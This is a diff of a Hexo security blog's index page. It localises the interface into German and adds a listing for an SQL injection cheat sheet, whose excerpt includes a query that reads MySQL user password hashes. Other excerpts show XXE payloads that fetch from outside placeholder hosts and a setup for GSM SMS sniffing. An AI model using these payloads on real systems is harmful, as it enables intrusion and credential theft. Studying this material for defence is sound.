@@ -175,7 +175,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Home
+            Startseite
           </a>
         </li>
       
@@ -185,7 +185,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archives
+            Archiv
           </a>
         </li>
       
@@ -208,7 +208,7 @@
             
               <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
             
-            Search
+            Suche
           </a>
         </li>
       
@@ -261,6 +261,111 @@
             
               
                 
+                <a class="post-title-link" href="/2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/" itemprop="url">
+                  SQL Injection Cheat Sheet: MySQL
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-04-11T00:45:14+08:00" content="2016-04-11">
+              2016-04-11
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">/*</span><br><span class="line">-- -</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
+<h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT VERSION();</span><br><span class="line">SELECT @@VERSION;</span><br><span class="line">SELECT @@GLOBAL.VERSION;</span><br></pre></td></tr></table></figure>
+<h3 id="User-details"><a href="#User-details" class="headerlink" title="User details"></a>User details</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT user()</span><br><span class="line">SELECT current_user()</span><br><span class="line">SELECT system_user()</span><br><span class="line">SELECT session_user()</span><br><span class="line">SELECT user,password FROM mysql.user;   # list Users</span><br></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/#more" rel="contents">
+              Weiterlesen &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/03/30/XXE-Payloads/" itemprop="url">
                   XXE_Payloads
                 </a>
@@ -274,7 +379,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Posted on</span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
             <time itemprop="dateCreated" datetime="2016-03-30T13:55:27+08:00" content="2016-03-30">
               2016-03-30
             </time>
@@ -314,7 +419,7 @@
           <h3 id="Vanilla-used-to-verify-outbound-xxe-or-blind-xxe"><a href="#Vanilla-used-to-verify-outbound-xxe-or-blind-xxe" class="headerlink" title="Vanilla, used to verify outbound xxe or blind xxe"></a>Vanilla, used to verify outbound xxe or blind xxe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;http://x.x.x.x:443/test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;sp;&lt;/r&gt;</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/30/XXE-Payloads/#more" rel="contents">
-              Read more &raquo;
+              Weiterlesen &raquo;
             </a>
           </div>
         
@@ -377,7 +482,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Posted on</span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
             <time itemprop="dateCreated" datetime="2016-03-28T17:37:00+08:00" content="2016-03-28">
               2016-03-28
             </time>
@@ -420,7 +525,7 @@
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/28/Learn-Android-Security/#more" rel="contents">
-              Read more &raquo;
+              Weiterlesen &raquo;
             </a>
           </div>
         
@@ -483,7 +588,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Posted on</span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
             <time itemprop="dateCreated" datetime="2016-03-17T13:09:07+08:00" content="2016-03-17">
               2016-03-17
             </time>
@@ -523,7 +628,7 @@
           <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt; vim /etc/apt/sources.list</span><br><span class="line">&gt; deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib</span><br><span class="line">&gt; deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib</span><br><span class="line">&gt; deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br><span class="line">&gt; apt-get update</span><br><span class="line">&gt; aptitude install libtool shtool autoconf git-core pkg-config make gcc</span><br><span class="line">&gt; apt-get install build-essential libgmp3-dev libmpfr-dev libx11-6 libx11-dev texinfo flex bison libncurses5 libncurses5-dbg libncurses5-dev libncursesw5 libncursesw5-dbg  libncursesw5-dev zlibc zlib1g-dev libmpfr4 libmpc-dev libtalloc-dev synaptic</span><br><span class="line">&gt; mkdir osmocombb &amp;&amp; cd osmocombb</span><br><span class="line">&gt; wget -c http://bb.osmocom.org/trac/raw-attachment/wiki/GnuArmToolchain/gnu-arm-build.3.sh</span><br><span class="line">&gt; chmod +x gnu-arm-build.3.sh</span><br><span class="line">&gt; mkdir build install src</span><br><span class="line">&gt; cd src/</span><br><span class="line">&gt; wget http://ftp.gnu.org/gnu/gcc/gcc-4.8.2/gcc-4.8.2.tar.bz2</span><br><span class="line">&gt; wget http://ftp.gnu.org/gnu/binutils/binutils-2.21.1a.tar.bz2</span><br><span class="line">&gt; wget ftp://sources.redhat.com/pub/newlib/newlib-1.19.0.tar.gz</span><br><span class="line">&gt; cd /root/osmocombb &amp;&amp; ./gnu-arm-build.3.sh</span><br><span class="line">&gt; export PATH=$PATH:/root/osmocombb/install/bin</span><br><span class="line">&gt; git clone git://git.osmocom.org/libosmocore.git &amp;&amp; cd libosmocore</span><br><span class="line">&gt; autoreconf -i</span><br><span class="line">&gt; ./configure</span><br><span class="line">&gt; make &amp;&amp; sudo make install</span><br><span class="line">&gt; cd .. &amp;&amp; sudo ldconfig</span><br><span class="line">&gt; git clone git://git.osmocom.org/osmocom-bb.git</span><br><span class="line">&gt; cd /root/osmocombb/osmocom-bb &amp;&amp; git checkout --track origin/luca/gsmmap</span><br><span class="line">&gt; cd src </span><br><span class="line">&gt; make</span><br><span class="line">&gt; cd ~/osmocombb/osmocom-bb/src/host/osmocon/ &amp;&amp; ./osmocon -m c123xor -p /dev/ttyUSB0 ../../target/firmware/board/compal_e88/layer1.compalram.bin    #此时需要按一下手机的红色关机键，等待手机出现Osmocom-bb系统</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/17/GSM-Hacking-With-SMS-Sniffer-for-Kali2/#more" rel="contents">
-              Read more &raquo;
+              Weiterlesen &raquo;
             </a>
           </div>
         
@@ -586,7 +691,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Posted on</span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
             <time itemprop="dateCreated" datetime="2016-03-15T22:10:17+08:00" content="2016-03-15">
               2016-03-15
             </time>
@@ -627,7 +732,7 @@
 <h3 id="0x02-安装应用程序"><a href="#0x02-安装应用程序" class="headerlink" title="0x02 安装应用程序"></a>0x02 安装应用程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo apt-get update</span><br><span class="line">&gt; sudo apt-get install build-essential golang mercurial</span><br><span class="line">&gt; git clone https://github.com/inconshreveable/ngrok.git &amp;&amp; cd ngrok</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/15/Run-Ngrok-on-Your-Own-Server/#more" rel="contents">
-              Read more &raquo;
+              Weiterlesen &raquo;
             </a>
           </div>
         
@@ -690,7 +795,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Posted on</span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
             <time itemprop="dateCreated" datetime="2016-03-15T00:19:17+08:00" content="2016-03-15">
               2016-03-15
             </time>
@@ -733,7 +838,7 @@
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/15/PHP-Code-Review/#more" rel="contents">
-              Read more &raquo;
+              Weiterlesen &raquo;
             </a>
           </div>
         
@@ -796,7 +901,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Posted on</span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
             <time itemprop="dateCreated" datetime="2016-03-15T00:19:17+08:00" content="2016-03-15">
               2016-03-15
             </time>
@@ -839,7 +944,7 @@
 <p>如果不需要代理执行如下命令取消<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; unset http_proxy      #取消http proxy</span><br><span class="line">&gt; unset https_proxy     #取消https proxy</span><br></pre></td></tr></table></figure></p>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/15/Metasploit-Install-On-Mac-osx-10-11-3/#more" rel="contents">
-              Read more &raquo;
+              Weiterlesen &raquo;
             </a>
           </div>
         
@@ -902,7 +1007,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Posted on</span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
             <time itemprop="dateCreated" datetime="2016-03-12T17:27:02+08:00" content="2016-03-12">
               2016-03-12
             </time>
@@ -950,7 +1055,7 @@
 <h3 id="0x04-写入系统"><a href="#0x04-写入系统" class="headerlink" title="0x04 写入系统"></a>0x04 写入系统</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo dd bs=4m if=2015-11-21-raspbian-jessie.img of=/dev/rdisk2    ＃if output error dd: /dev/rdisk2: Resource busy,then restart system</span><br><span class="line"></span><br><span class="line">938+0 records in</span><br><span class="line">938+0 records out</span><br><span class="line">3934257152 bytes transferred in 183.262297 secs (21467903 bytes/sec)</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/12/Raspberry-Pi-Tips/#more" rel="contents">
-              Read more &raquo;
+              Weiterlesen &raquo;
             </a>
           </div>
         
@@ -1013,7 +1118,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Posted on</span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
             <time itemprop="dateCreated" datetime="2016-03-12T01:28:24+08:00" content="2016-03-12">
               2016-03-12
             </time>
@@ -1060,7 +1165,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM &quot;http://[IP]/some.dtd&quot;&gt;%dtd]&gt;</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/12/XML-Entity-cheatsheet/#more" rel="contents">
-              Read more &raquo;
+              Weiterlesen &raquo;
             </a>
           </div>
         
@@ -1134,8 +1239,8 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">48</span>
-              <span class="site-state-item-name">posts</span>
+              <span class="site-state-item-count">49</span>
+              <span class="site-state-item-name">Artikel</span>
             </a>
           </div>
 
@@ -1145,7 +1250,7 @@
             <div class="site-state-item site-state-tags">
               <a href="/tags">
                 <span class="site-state-item-count">43</span>
-                <span class="site-state-item-name">tags</span>
+                <span class="site-state-item-name">Tags</span>
               </a>
             </div>
           
@@ -1209,6 +1314,10 @@
                   <a href="http://www.thinkings.org" title="Tr3jer" target="_blank">Tr3jer</a>
                 </li>
               
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.php101.cn" title="tudouya" target="_blank">tudouya</a>
+                </li>
+              
             </ul>
           </div>
         
@@ -1238,7 +1347,7 @@
 </div>
 
 <div class="powered-by">
-  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+  Erstellt mit  <a class="theme-link" href="http://hexo.io">Hexo</a>
 </div>
 
 <div class="theme-info">
